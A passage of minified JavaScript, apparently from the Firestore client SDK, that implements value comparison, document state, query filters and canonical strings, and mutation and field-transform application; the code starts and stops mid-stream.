n{constructor(e,t){this.projectId=e,this.database=t||"(default)"}static empty(){return new n("","")}get isDefaultDatabase(){return this.database==="(default)"}isEqual(e){return e instanceof n&&e.projectId===this.projectId&&e.database===this.database}};var mi={mapValue:{fields:{__type__:{stringValue:"__max__"}}}},ff={nullValue:"NULL_VALUE"};function po(n){return"nullValue"in n?0:"booleanValue"in n?1:"integerValue"in n||"doubleValue"in n?2:"timestampValue"in n?3:"stringValue"in n?5:"bytesValue"in n?6:"referenceValue"in n?7:"geoPointValue"in n?8:"arrayValue"in n?9:"mapValue"in n?pp(n)?4:LM(n)?9007199254740991:gp(n)?10:11:z()}function Qn(n,e){if(n===e)return!0;let t=po(n);if(t!==po(e))return!1;switch(t){case 0:case 9007199254740991:return!0;case 1:return n.booleanValue===e.booleanValue;case 4:return Eu(n).isEqual(Eu(e));case 3:return function(i,o){if(typeof i.timestampValue=="string"&&typeof o.timestampValue=="string"&&i.timestampValue.length===o.timestampValue.length)return i.timestampValue===o.timestampValue;let s=Ar(i.timestampValue),a=Ar(o.timestampValue);return s.seconds===a.seconds&&s.nanos===a.nanos}(n,e);case 5:return n.stringValue===e.stringValue;case 6:return function(i,o){return wi(i.bytesValue).isEqual(wi(o.bytesValue))}(n,e);case 7:return n.referenceValue===e.referenceValue;case 8:return function(i,o){return je(i.geoPointValue.latitude)===je(o.geoPointValue.latitude)&&je(i.geoPointValue.longitude)===je(o.geoPointValue.longitude)}(n,e);case 2:return function(i,o){if("integerValue"in i&&"integerValue"in o)return je(i.integerValue)===je(o.integerValue);if("doubleValue"in i&&"doubleValue"in o){let s=je(i.doubleValue),a=je(o.doubleValue);return s===a?_u(s)===_u(a):isNaN(s)&&isNaN(a)}return!1}(n,e);case 9:return Xs(n.arrayValue.values||[],e.arrayValue.values||[],Qn);case 10:case 11:return function(i,o){let s=i.mapValue.fields||{},a=o.mapValue.fields||{};if(bA(s)!==bA(a))return!1;for(let c in s)if(s.hasOwnProperty(c)&&(a[c]===void 0||!Qn(s[c],a[c])))return!1;return!0}(n,e);default:return z()}}function Iu(n,e){return(n.values||[]).find(t=>Qn(t,e))!==void 0}function Ii(n,e){if(n===e)return 0;let t=po(n),r=po(e);if(t!==r)return re(t,r);switch(t){case 0:case 9007199254740991:return 0;case 1:return re(n.booleanValue,e.booleanValue);case 2:return function(o,s){let a=je(o.integerValue||o.doubleValue),c=je(s.integerValue||s.doubleValue);return a<c?-1:a>c?1:a===c?0:isNaN(a)?isNaN(c)?0:-1:1}(n,e);case 3:return TA(n.timestampValue,e.timestampValue);case 4:return TA(Eu(n),Eu(e));case 5:return re(n.stringValue,e.stringValue);case 6:return function(o,s){let a=wi(o),c=wi(s);return a.compareTo(c)}(n.bytesValue,e.bytesValue);case 7:return function(o,s){let a=o.split("/"),c=s.split("/");for(let l=0;l<a.length&&l<c.length;l++){let h=re(a[l],c[l]);if(h!==0)return h}return re(a.length,c.length)}(n.referenceValue,e.referenceValue);case 8:return function(o,s){let a=re(je(o.latitude),je(s.latitude));return a!==0?a:re(je(o.longitude),je(s.longitude))}(n.geoPointValue,e.geoPointValue);case 9:return SA(n.arrayValue,e.arrayValue);case 10:return function(o,s){var a,c,l,h;let p=o.fields||{},m=s.fields||{},y=(a=p.value)===null||a===void 0?void 0:a.arrayValue,D=(c=m.value)===null||c===void 0?void 0:c.arrayValue,b=re(((l=y?.values)===null||l===void 0?void 0:l.length)||0,((h=D?.values)===null||h===void 0?void 0:h.length)||0);return b!==0?b:SA(y,D)}(n.mapValue,e.mapValue);case 11:return function(o,s){if(o===mi.mapValue&&s===mi.mapValue)return 0;if(o===mi.mapValue)return 1;if(s===mi.mapValue)return-1;let a=o.fields||{},c=Object.keys(a),l=s.fields||{},h=Object.keys(l);c.sort(),h.sort();for(let p=0;p<c.length&&p<h.length;++p){let m=re(c[p],h[p]);if(m!==0)return m;let y=Ii(a[c[p]],l[h[p]]);if(y!==0)return y}return re(c.length,h.length)}(n.mapValue,e.mapValue);default:throw z()}}function TA(n,e){if(typeof n=="string"&&typeof e=="string"&&n.length===e.length)return re(n,e);let t=Ar(n),r=Ar(e),i=re(t.seconds,r.seconds);return i!==0?i:re(t.nanos,r.nanos)}function SA(n,e){let t=n.values||[],r=e.values||[];for(let i=0;i<t.length&&i<r.length;++i){let o=Ii(t[i],r[i]);if(o)return o}return re(t.length,r.length)}function ta(n){return v_(n)}function v_(n){return"nullValue"in n?"null":"booleanValue"in n?""+n.booleanValue:"integerValue"in n?""+n.integerValue:"doubleValue"in n?""+n.doubleValue:"timestampValue"in n?function(t){let r=Ar(t);return`time(${r.seconds},${r.nanos})`}(n.timestampValue):"stringValue"in n?n.stringValue:"bytesValue"in n?function(t){return wi(t).toBase64()}(n.bytesValue):"referenceValue"in n?function(t){return q.fromName(t).toString()}(n.referenceValue):"geoPointValue"in n?function(t){return`geo(${t.latitude},${t.longitude})`}(n.geoPointValue):"arrayValue"in n?function(t){let r="[",i=!0;for(let o of t.values||[])i?i=!1:r+=",",r+=v_(o);return r+"]"}(n.arrayValue):"mapValue"in n?function(t){let r=Object.keys(t.fields||{}).sort(),i="{",o=!0;for(let s of r)o?o=!1:i+=",",i+=`${s}:${v_(t.fields[s])}`;return i+"}"}(n.mapValue):z()}function go(n,e){return{referenceValue:`projects/${n.projectId}/databases/${n.database}/documents/${e.path.canonicalString()}`}}function __(n){return!!n&&"integerValue"in n}function Du(n){return!!n&&"arrayValue"in n}function AA(n){return!!n&&"nullValue"in n}function MA(n){return!!n&&"doubleValue"in n&&isNaN(Number(n.doubleValue))}function pf(n){return!!n&&"mapValue"in n}function gp(n){var e,t;return((t=(((e=n?.mapValue)===null||e===void 0?void 0:e.fields)||{}).__type__)===null||t===void 0?void 0:t.stringValue)==="__vector__"}function fu(n){if(n.geoPointValue)return{geoPointValue:Object.assign({},n.geoPointValue)};if(n.timestampValue&&typeof n.timestampValue=="object")return{timestampValue:Object.assign({},n.timestampValue)};if(n.mapValue){let e={mapValue:{fields:{}}};return bo(n.mapValue.fields,(t,r)=>e.mapValue.fields[t]=fu(r)),e}if(n.arrayValue){let e={arrayValue:{values:[]}};for(let t=0;t<(n.arrayValue.values||[]).length;++t)e.arrayValue.values[t]=fu(n.arrayValue.values[t]);return e}return Object.assign({},n)}function LM(n){return(((n.mapValue||{}).fields||{}).__type__||{}).stringValue==="__max__"}var UM={mapValue:{fields:{__type__:{stringValue:"__vector__"},value:{arrayValue:{}}}}};function OB(n){return"nullValue"in n?ff:"booleanValue"in n?{booleanValue:!1}:"integerValue"in n||"doubleValue"in n?{doubleValue:NaN}:"timestampValue"in n?{timestampValue:{seconds:Number.MIN_SAFE_INTEGER}}:"stringValue"in n?{stringValue:""}:"bytesValue"in n?{bytesValue:""}:"referenceValue"in n?go(Ei.empty(),q.empty()):"geoPointValue"in n?{geoPointValue:{latitude:-90,longitude:-180}}:"arrayValue"in n?{arrayValue:{}}:"mapValue"in n?gp(n)?UM:{mapValue:{}}:z()}function FB(n){return"nullValue"in n?{booleanValue:!1}:"booleanValue"in n?{doubleValue:NaN}:"integerValue"in n||"doubleValue"in n?{timestampValue:{seconds:Number.MIN_SAFE_INTEGER}}:"timestampValue"in n?{stringValue:""}:"stringValue"in n?{bytesValue:""}:"bytesValue"in n?go(Ei.empty(),q.empty()):"referenceValue"in n?{geoPointValue:{latitude:-90,longitude:-180}}:"geoPointValue"in n?{arrayValue:{}}:"arrayValue"in n?UM:"mapValue"in n?gp(n)?{mapValue:{}}:mi:z()}function xA(n,e){let t=Ii(n.value,e.value);return t!==0?t:n.inclusive&&!e.inclusive?-1:!n.inclusive&&e.inclusive?1:0}function RA(n,e){let t=Ii(n.value,e.value);return t!==0?t:n.inclusive&&!e.inclusive?1:!n.inclusive&&e.inclusive?-1:0}var St=class n{constructor(e){this.value=e}static empty(){return new n({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let r=0;r<e.length-1;++r)if(t=(t.mapValue.fields||{})[e.get(r)],!pf(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=fu(t)}setAll(e){let t=Je.emptyPath(),r={},i=[];e.forEach((s,a)=>{if(!t.isImmediateParentOf(a)){let c=this.getFieldsMap(t);this.applyChanges(c,r,i),r={},i=[],t=a.popLast()}s?r[a.lastSegment()]=fu(s):i.push(a.lastSegment())});let o=this.getFieldsMap(t);this.applyChanges(o,r,i)}delete(e){let t=this.field(e.popLast());pf(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return Qn(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let r=0;r<e.length;++r){let i=t.mapValue.fields[e.get(r)];pf(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},t.mapValue.fields[e.get(r)]=i),t=i}return t.mapValue.fields}applyChanges(e,t,r){bo(t,(i,o)=>e[i]=o);for(let i of r)delete e[i]}clone(){return new n(fu(this.value))}};function jM(n){let e=[];return bo(n.fields,(t,r)=>{let i=new Je([t]);if(pf(r)){let o=jM(r.mapValue).fields;if(o.length===0)e.push(i);else for(let s of o)e.push(i.child(s))}else e.push(i)}),new on(e)}var at=class n{constructor(e,t,r,i,o,s,a){this.key=e,this.documentType=t,this.version=r,this.readTime=i,this.createTime=o,this.data=s,this.documentState=a}static newInvalidDocument(e){return new n(e,0,ee.min(),ee.min(),ee.min(),St.empty(),0)}static newFoundDocument(e,t,r,i){return new n(e,1,t,ee.min(),r,i,0)}static newNoDocument(e,t){return new n(e,2,t,ee.min(),ee.min(),St.empty(),0)}static newUnknownDocument(e,t){return new n(e,3,t,ee.min(),ee.min(),St.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(ee.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=St.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=St.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=ee.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof n&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new n(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}};var Yn=class{constructor(e,t){this.position=e,this.inclusive=t}};function NA(n,e,t){let r=0;for(let i=0;i<n.position.length;i++){let o=e[i],s=n.position[i];if(o.field.isKeyField()?r=q.comparator(q.fromName(s.referenceValue),t.key):r=Ii(s,t.data.field(o.field)),o.dir==="desc"&&(r*=-1),r!==0)break}return r}function PA(n,e){if(n===null)return e===null;if(e===null||n.inclusive!==e.inclusive||n.position.length!==e.position.length)return!1;for(let t=0;t<n.position.length;t++)if(!Qn(n.position[t],e.position[t]))return!1;return!0}var mo=class{constructor(e,t="asc"){this.field=e,this.dir=t}};function VB(n,e){return n.dir===e.dir&&n.field.isEqual(e.field)}var Cf=class{},ge=class n extends Cf{constructor(e,t,r){super(),this.field=e,this.op=t,this.value=r}static create(e,t,r){return e.isKeyField()?t==="in"||t==="not-in"?this.createKeyFieldInFilter(e,t,r):new I_(e,t,r):t==="array-contains"?new b_(e,r):t==="in"?new bf(e,r):t==="not-in"?new T_(e,r):t==="array-contains-any"?new S_(e,r):new n(e,t,r)}static createKeyFieldInFilter(e,t,r){return t==="in"?new D_(e,r):new C_(e,r)}matches(e){let t=e.data.field(this.field);return this.op==="!="?t!==null&&this.matchesComparison(Ii(t,this.value)):t!==null&&po(this.value)===po(t)&&this.matchesComparison(Ii(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return z()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}},Se=class n extends Cf{constructor(e,t){super(),this.filters=e,this.op=t,this.ae=null}static create(e,t){return new n(e,t)}matches(e){return na(this)?this.filters.find(t=>!t.matches(e))===void 0:this.filters.find(t=>t.matches(e))!==void 0}getFlattenedFilters(){return this.ae!==null||(this.ae=this.filters.reduce((e,t)=>e.concat(t.getFlattenedFilters()),[])),this.ae}getFilters(){return Object.assign([],this.filters)}};function na(n){return n.op==="and"}function w_(n){return n.op==="or"}function uE(n){return BM(n)&&na(n)}function BM(n){for(let e of n.filters)if(e instanceof Se)return!1;return!0}function E_(n){if(n instanceof ge)return n.field.canonicalString()+n.op.toString()+ta(n.value);if(uE(n))return n.filters.map(e=>E_(e)).join(",");{let e=n.filters.map(t=>E_(t)).join(",");return`${n.op}(${e})`}}function $M(n,e){return n instanceof ge?function(r,i){return i instanceof ge&&r.op===i.op&&r.field.isEqual(i.field)&&Qn(r.value,i.value)}(n,e):n instanceof Se?function(r,i){return i instanceof Se&&r.op===i.op&&r.filters.length===i.filters.length?r.filters.reduce((o,s,a)=>o&&$M(s,i.filters[a]),!0):!1}(n,e):void z()}function HM(n,e){let t=n.filters.concat(e);return Se.create(t,n.op)}function qM(n){return n instanceof ge?function(t){return`${t.field.canonicalString()} ${t.op} ${ta(t.value)}`}(n):n instanceof Se?function(t){return t.op.toString()+" {"+t.getFilters().map(qM).join(" ,")+"}"}(n):"Filter"}var I_=class extends ge{constructor(e,t,r){super(e,t,r),this.key=q.fromName(r.referenceValue)}matches(e){let t=q.comparator(e.key,this.key);return this.matchesComparison(t)}},D_=class extends ge{constructor(e,t){super(e,"in",t),this.keys=zM("in",t)}matches(e){return this.keys.some(t=>t.isEqual(e.key))}},C_=class extends ge{constructor(e,t){super(e,"not-in",t),this.keys=zM("not-in",t)}matches(e){return!this.keys.some(t=>t.isEqual(e.key))}};function zM(n,e){var t;return(((t=e.arrayValue)===null||t===void 0?void 0:t.values)||[]).map(r=>q.fromName(r.referenceValue))}var b_=class extends ge{constructor(e,t){super(e,"array-contains",t)}matches(e){let t=e.data.field(this.field);return Du(t)&&Iu(t.arrayValue,this.value)}},bf=class extends ge{constructor(e,t){super(e,"in",t)}matches(e){let t=e.data.field(this.field);return t!==null&&Iu(this.value.arrayValue,t)}},T_=class extends ge{constructor(e,t){super(e,"not-in",t)}matches(e){if(Iu(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;let t=e.data.field(this.field);return t!==null&&!Iu(this.value.arrayValue,t)}},S_=class extends ge{constructor(e,t){super(e,"array-contains-any",t)}matches(e){let t=e.data.field(this.field);return!(!Du(t)||!t.arrayValue.values)&&t.arrayValue.values.some(r=>Iu(this.value.arrayValue,r))}};var A_=class{constructor(e,t=null,r=[],i=[],o=null,s=null,a=null){this.path=e,this.collectionGroup=t,this.orderBy=r,this.filters=i,this.limit=o,this.startAt=s,this.endAt=a,this.ue=null}};function M_(n,e=null,t=[],r=[],i=null,o=null,s=null){return new A_(n,e,t,r,i,o,s)}function yo(n){let e=H(n);if(e.ue===null){let t=e.path.canonicalString();e.collectionGroup!==null&&(t+="|cg:"+e.collectionGroup),t+="|f:",t+=e.filters.map(r=>E_(r)).join(","),t+="|ob:",t+=e.orderBy.map(r=>function(o){return o.field.canonicalString()+o.dir}(r)).join(","),Uu(e.limit)||(t+="|l:",t+=e.limit),e.startAt&&(t+="|lb:",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map(r=>ta(r)).join(",")),e.endAt&&(t+="|ub:",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map(r=>ta(r)).join(",")),e.ue=t}return e.ue}function ju(n,e){if(n.limit!==e.limit||n.orderBy.length!==e.orderBy.length)return!1;for(let t=0;t<n.orderBy.length;t++)if(!VB(n.orderBy[t],e.orderBy[t]))return!1;if(n.filters.length!==e.filters.length)return!1;for(let t=0;t<n.filters.length;t++)if(!$M(n.filters[t],e.filters[t]))return!1;return n.collectionGroup===e.collectionGroup&&!!n.path.isEqual(e.path)&&!!PA(n.startAt,e.startAt)&&PA(n.endAt,e.endAt)}function Tf(n){return q.isDocumentKey(n.path)&&n.collectionGroup===null&&n.filters.length===0}function Sf(n,e){return n.filters.filter(t=>t instanceof ge&&t.field.isEqual(e))}function kA(n,e,t){let r=ff,i=!0;for(let o of Sf(n,e)){let s=ff,a=!0;switch(o.op){case"<":case"<=":s=OB(o.value);break;case"==":case"in":case">=":s=o.value;break;case">":s=o.value,a=!1;break;case"!=":case"not-in":s=ff}xA({value:r,inclusive:i},{value:s,inclusive:a})<0&&(r=s,i=a)}if(t!==null){for(let o=0;o<n.orderBy.length;++o)if(n.orderBy[o].field.isEqual(e)){let s=t.position[o];xA({value:r,inclusive:i},{value:s,inclusive:t.inclusive})<0&&(r=s,i=t.inclusive);break}}return{value:r,inclusive:i}}function OA(n,e,t){let r=mi,i=!0;for(let o of Sf(n,e)){let s=mi,a=!0;switch(o.op){case">=":case">":s=FB(o.value),a=!1;break;case"==":case"in":case"<=":s=o.value;break;case"<":s=o.value,a=!1;break;case"!=":case"not-in":s=mi}RA({value:r,inclusive:i},{value:s,inclusive:a})>0&&(r=s,i=a)}if(t!==null){for(let o=0;o<n.orderBy.length;++o)if(n.orderBy[o].field.isEqual(e)){let s=t.position[o];RA({value:r,inclusive:i},{value:s,inclusive:t.inclusive})>0&&(r=s,i=t.inclusive);break}}return{value:r,inclusive:i}}var xn=class{constructor(e,t=null,r=[],i=[],o=null,s="F",a=null,c=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=r,this.filters=i,this.limit=o,this.limitType=s,this.startAt=a,this.endAt=c,this.ce=null,this.le=null,this.he=null,this.startAt,this.endAt}};function GM(n,e,t,r,i,o,s,a){return new xn(n,e,t,r,i,o,s,a)}function ya(n){return new xn(n)}function FA(n){return n.filters.length===0&&n.limit===null&&n.startAt==null&&n.endAt==null&&(n.explicitOrderBy.length===0||n.explicitOrderBy.length===1&&n.explicitOrderBy[0].field.isKeyField())}function lE(n){return n.collectionGroup!==null}function Zs(n){let e=H(n);if(e.ce===null){e.ce=[];let t=new Set;for(let o of e.explicitOrderBy)e.ce.push(o),t.add(o.field.canonicalString());let r=e.explicitOrderBy.length>0?e.explicitOrderBy[e.explicitOrderBy.length-1].dir:"asc";(function(s){let a=new Re(Je.comparator);return s.filters.forEach(c=>{c.getFlattenedFilters().forEach(l=>{l.isInequality()&&(a=a.add(l.field))})}),a})(e).forEach(o=>{t.has(o.canonicalString())||o.isKeyField()||e.ce.push(new mo(o,r))}),t.has(Je.keyField().canonicalString())||e.ce.push(new mo(Je.keyField(),r))}return e.ce}function Lt(n){let e=H(n);return e.le||(e.le=LB(e,Zs(n))),e.le}function LB(n,e){if(n.limitType==="F")return M_(n.path,n.collectionGroup,e,n.filters,n.limit,n.startAt,n.endAt);{e=e.map(i=>{let o=i.dir==="desc"?"asc":"desc";return new mo(i.field,o)});let t=n.endAt?new Yn(n.endAt.position,n.endAt.inclusive):null,r=n.startAt?new Yn(n.startAt.position,n.startAt.inclusive):null;return M_(n.path,n.collectionGroup,e,n.filters,n.limit,t,r)}}function x_(n,e){let t=n.filters.concat([e]);return new xn(n.path,n.collectionGroup,n.explicitOrderBy.slice(),t,n.limit,n.limitType,n.startAt,n.endAt)}function Af(n,e,t){return new xn(n.path,n.collectionGroup,n.explicitOrderBy.slice(),n.filters.slice(),e,t,n.startAt,n.endAt)}function Bu(n,e){return ju(Lt(n),Lt(e))&&n.limitType===e.limitType}function WM(n){return`${yo(Lt(n))}|lt:${n.limitType}`}function zs(n){return`Query(target=${function(t){let r=t.path.canonicalString();return t.collectionGroup!==null&&(r+=" collectionGroup="+t.collectionGroup),t.filters.length>0&&(r+=`, filters: [${t.filters.map(i=>qM(i)).join(", ")}]`),Uu(t.limit)||(r+=", limit: "+t.limit),t.orderBy.length>0&&(r+=`, orderBy: [${t.orderBy.map(i=>function(s){return`${s.field.canonicalString()} (${s.dir})`}(i)).join(", ")}]`),t.startAt&&(r+=", startAt: ",r+=t.startAt.inclusive?"b:":"a:",r+=t.startAt.position.map(i=>ta(i)).join(",")),t.endAt&&(r+=", endAt: ",r+=t.endAt.inclusive?"a:":"b:",r+=t.endAt.position.map(i=>ta(i)).join(",")),`Target(${r})`}(Lt(n))}; limitType=${n.limitType})`}function $u(n,e){return e.isFoundDocument()&&function(r,i){let o=i.key.path;return r.collectionGroup!==null?i.key.hasCollectionId(r.collectionGroup)&&r.path.isPrefixOf(o):q.isDocumentKey(r.path)?r.path.isEqual(o):r.path.isImmediateParentOf(o)}(n,e)&&function(r,i){for(let o of Zs(r))if(!o.field.isKeyField()&&i.data.field(o.field)===null)return!1;return!0}(n,e)&&function(r,i){for(let o of r.filters)if(!o.matches(i))return!1;return!0}(n,e)&&function(r,i){return!(r.startAt&&!function(s,a,c){let l=NA(s,a,c);return s.inclusive?l<=0:l<0}(r.startAt,Zs(r),i)||r.endAt&&!function(s,a,c){let l=NA(s,a,c);return s.inclusive?l>=0:l>0}(r.endAt,Zs(r),i))}(n,e)}function KM(n){return n.collectionGroup||(n.path.length%2==1?n.path.lastSegment():n.path.get(n.path.length-2))}function QM(n){return(e,t)=>{let r=!1;for(let i of Zs(n)){let o=UB(i,e,t);if(o!==0)return o;r=r||i.field.isKeyField()}return 0}}function UB(n,e,t){let r=n.field.isKeyField()?q.comparator(e.key,t.key):function(o,s,a){let c=s.data.field(o),l=a.data.field(o);return c!==null&&l!==null?Ii(c,l):z()}(n.field,e,t);switch(n.dir){case"asc":return r;case"desc":return-1*r;default:return z()}}var Zn=class{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){let t=this.mapKeyFn(e),r=this.inner[t];if(r!==void 0){for(let[i,o]of r)if(this.equalsFn(i,e))return o}}has(e){return this.get(e)!==void 0}set(e,t){let r=this.mapKeyFn(e),i=this.inner[r];if(i===void 0)return this.inner[r]=[[e,t]],void this.innerSize++;for(let o=0;o<i.length;o++)if(this.equalsFn(i[o][0],e))return void(i[o]=[e,t]);i.push([e,t]),this.innerSize++}delete(e){let t=this.mapKeyFn(e),r=this.inner[t];if(r===void 0)return!1;for(let i=0;i<r.length;i++)if(this.equalsFn(r[i][0],e))return r.length===1?delete this.inner[t]:r.splice(i,1),this.innerSize--,!0;return!1}forEach(e){bo(this.inner,(t,r)=>{for(let[i,o]of r)e(i,o)})}isEmpty(){return FM(this.inner)}size(){return this.innerSize}};var jB=new Fe(q.comparator);function Wt(){return jB}var YM=new Fe(q.comparator);function du(...n){let e=YM;for(let t of n)e=e.insert(t.key,t);return e}function ZM(n){let e=YM;return n.forEach((t,r)=>e=e.insert(t,r.overlayedDocument)),e}function zn(){return pu()}function JM(){return pu()}function pu(){return new Zn(n=>n.toString(),(n,e)=>n.isEqual(e))}var BB=new Fe(q.comparator),$B=new Re(q.comparator);function ie(...n){let e=$B;for(let t of n)e=e.add(t);return e}var HB=new Re(re);function dE(){return HB}function hE(n,e){if(n.useProto3Json){if(isNaN(e))return{doubleValue:"NaN"};if(e===1/0)return{doubleValue:"Infinity"};if(e===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:_u(e)?"-0":e}}function XM(n){return{integerValue:""+n}}function ex(n,e){return RM(e)?XM(e):hE(n,e)}var ra=class{constructor(){this._=void 0}};function qB(n,e,t){return n instanceof Di?function(i,o){let s={fields:{__type__:{stringValue:"server_timestamp"},__local_write_time__:{timestampValue:{seconds:i.seconds,nanos:i.nanoseconds}}}};return o&&pp(o)&&(o=cE(o)),o&&(s.fields.__previous_value__=o),{mapValue:s}}(t,e):n instanceof Mr?nx(n,e):n instanceof xr?rx(n,e):function(i,o){let s=tx(i,o),a=VA(s)+VA(i.Pe);return __(s)&&__(i.Pe)?XM(a):hE(i.serializer,a)}(n,e)}function zB(n,e,t){return n instanceof Mr?nx(n,e):n instanceof xr?rx(n,e):t}function tx(n,e){return n instanceof Ci?function(r){return __(r)||function(o){return!!o&&"doubleValue"in o}(r)}(e)?e:{integerValue:0}:null}var Di=class extends ra{},Mr=class extends ra{constructor(e){super(),this.elements=e}};function nx(n,e){let t=ix(e);for(let r of n.elements)t.some(i=>Qn(i,r))||t.push(r);return{arrayValue:{values:t}}}var xr=class extends ra{constructor(e){super(),this.elements=e}};function rx(n,e){let t=ix(e);for(let r of n.elements)t=t.filter(i=>!Qn(i,r));return{arrayValue:{values:t}}}var Ci=class extends ra{constructor(e,t){super(),this.serializer=e,this.Pe=t}};function VA(n){return je(n.integerValue||n.doubleValue)}function ix(n){return Du(n)&&n.arrayValue.values?n.arrayValue.values.slice():[]}var vo=class{constructor(e,t){this.field=e,this.transform=t}};function GB(n,e){return n.field.isEqual(e.field)&&function(r,i){return r instanceof Mr&&i instanceof Mr||r instanceof xr&&i instanceof xr?Xs(r.elements,i.elements,Qn):r instanceof Ci&&i instanceof Ci?Qn(r.Pe,i.Pe):r instanceof Di&&i instanceof Di}(n.transform,e.transform)}var R_=class{constructor(e,t){this.version=e,this.transformResults=t}},We=class n{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new n}static exists(e){return new n(void 0,e)}static updateTime(e){return new n(e)}get isNone(){return this.updateTime===void 0&&this.exists===void 0}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}};function gf(n,e){return n.updateTime!==void 0?e.isFoundDocument()&&e.version.isEqual(n.updateTime):n.exists===void 0||n.exists===e.isFoundDocument()}var ia=class{};function ox(n,e){if(!n.hasLocalMutations||e&&e.fields.length===0)return null;if(e===null)return n.isNoDocument()?new Ti(n.key,We.none()):new bi(n.key,n.data,We.none());{let t=n.data,r=St.empty(),i=new Re(Je.comparator);for(let o of e.fields)if(!i.has(o)){let s=t.field(o);s===null&&o.length>1&&(o=o.popLast(),s=t.field(o)),s===null?r.delete(o):r.set(o,s),i=i.add(o)}return new Rn(n.key,r,new on(i.toArray()),We.none())}}function WB(n,e,t){n instanceof bi?function(i,o,s){let a=i.value.clone(),c=UA(i.fieldTransforms,o,s.transformResults);a.setAll(c),o.convertToFoundDocument(s.version,a).setHasCommittedMutations()}(n,e,t):n instanceof Rn?function(i,o,s){if(!gf(i.precondition,o))return void o.convertToUnknownDocument(s.version);let a=UA(i.fieldTransforms,o,s.transformResults),c=o.data;c.setAll(sx(i)),c.setAll(a),o.convertToFoundDocument(s.version,c).setHasCommittedMutations()}(n,e,t):function(i,o,s){o.convertToNoDocument(s.version).setHasCommittedMutations()}(0,e,t)}function gu(n,e,t,r){return n instanceof bi?function(o,s,a,c){if(!gf(o.precondition,s))return a;let l=o.value.clone(),h=jA(o.fieldTransforms,c,s);return l.setAll(h),s.convertToFoundDocument(s.version,l).setHasLocalMutations(),null}(n,e,t,r):n instanceof Rn?function(o,s,a,c){if(!gf(o.precondition,s))return a;let l=jA(o.fieldTransforms,c,s),h=s.data;return h.setAll(sx(o)),h.setAll(l),s.convertToFoundDocument(s.version,h).setHasLocalMutations(),a===null?null:a.unionWith(o.fieldMask.fields).unionWith(o.fieldTransforms.map(p=>p.field))}(n,e,t,r):function(o,s,a){return gf(o.precondition,s)?(s.convertToNoDocument(s.version).setHasLocalMutations(),null):a}(n,e,t)}function KB(n,e){let t=null;for(let r of n.fieldTransforms){let i=e.data.field(r.field),o=tx(r.transform,i||null);o!=null&&(t===null&&(t=St.empty()),t.set(r.field,o))}return t||null}function LA(n,e){return n.type===e.type&&!!n.key.isEqual(e.key)&&!!n.precondition.isEqual(e.precondition)&&!!function(r,i){return r===void 0&&i===void 0||!(!r||!i)&&Xs(r,i,(o,s)=>GB(o,s))}(n.fieldTransforms,e.fieldTransforms)&&(n.type===0?n.value.isEqual(e.value):n.type!==1||n.data.isEqual(e.data)&&n.fieldMask.isEqual(e.fieldMask))}var bi=class extends ia{constructor(e,t,r,i=[]){super(),this.key=e,this.value=t,this.precondition=r,this.fieldTransforms=i,this.type=0}getFieldMask(){return null}},Rn=class extends ia{constructor(e,t,r,i,o=[]){super(),this.key=e,this.data=t,this.fieldMask=r,this.precondition=i,this.fieldTransforms=o,this.type=1}getFieldMask(){return this.fieldMask}};function sx(n){let e=new Map;return n.fieldMask.fields.forEach(t=>{if(!t.isEmpty()){let r=n.data.field(t);e.set(t,r)}}),e}function UA(n,e,t){let r=new Map;Q(n.length===t.length);for(let i=0;i<t.length;i++){let o=n[i],s=o.transform,a=e.data.field(o.field);r.set(o.field,zB(s,a,t[i]))}return r}function jA(n,e,t){let r=new Map;for(let i of n){let o=i.transform,s=t.data.field(i.field);r.set(i.field,qB(o,s,e))}return r}var Ti=class extends ia{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}},Cu=class extends ia{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}};var bu=class{constructor(e,t,r,i){this.batchId=e,this.localWriteTime=t,this.baseMutations=r,this.mutations=i}applyToRemoteDocument(e,t){let r=t.mutationResults;for(let i=0;i<this.mutations.length;i++){let 